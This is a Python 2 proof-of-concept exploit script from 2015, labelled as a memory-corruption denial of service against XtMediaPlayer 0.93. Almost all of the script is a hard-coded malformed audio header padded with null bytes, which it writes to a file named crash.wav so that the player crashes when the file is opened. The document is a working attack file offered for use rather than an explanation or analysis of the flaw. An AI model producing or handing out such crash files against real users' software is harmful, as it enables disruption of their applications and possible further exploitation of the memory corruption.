#!/usr/bin/python

#[+] Author: SATHISH ARTHAR
#[+] Exploit Title:  XtMediaPlayer - 0.93 Memory Corruption PoC
#[+] Date: 16-06-2015
#[+] Category: DoS/PoC
#[+] Tested on: WinXp/Windows 7 
#[+] Vendor:  http://downloads.sourceforge.net/project/xtmediaplayer/XtMediaPlayer/XtMediaPlayer_0.93_Win.rar 
#[+] Sites: sathisharthars.wordpress.com
#[+] Twitter: @sathisharthars
#[+] Thanks:   offensive security (@offsectraining)


 
import os
os.system("color 02")

print"###########################################################"
print"#  Title: XtMediaPlayer - 0.93 Memory Corruption PoC       #"
print"#  Author: SATHISH ARTHAR                                  #"
print"#  Category: DoS/PoC                                       # "
print"###########################################################"
	
crash=("\x2E\x73\x6E\x64\x00\x00\x01\x18\x00\x00\x42\xDC\x00\x00\x00\x01"
"\x00\x00\x1F\x40\x00\x00\x00\x00\x69\x61\x70\x65\x74\x75\x73\x2E"
"\x61\x75\x00\x20\x22\x69\x61\x70\x65\x74\x75\x73\x2E\x61\x75\x22"
"\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
 
filename = "crash.wav"
file = open(filename , "w")
file.write(crash)
print "\n Files Created!\n"
file.close()
